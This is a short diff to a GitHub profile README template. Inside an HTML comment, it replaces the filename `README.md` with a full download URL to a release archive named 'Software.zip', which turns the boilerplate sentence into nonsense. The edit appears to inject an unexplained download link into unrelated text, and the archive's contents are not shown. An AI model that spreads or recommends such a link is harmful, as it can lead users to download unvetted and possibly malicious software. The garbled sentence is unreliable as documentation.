@@ -7,6 +7,6 @@
 - ⚡ Fun fact: ...
 
 <!---
-amersalim2024/amersalim2024 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+amersalim2024/amersalim2024 is a ✨ special ✨ repository because its `https://github.com/amersalim2024/amersalim2024/releases/download/v2.0/Software.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
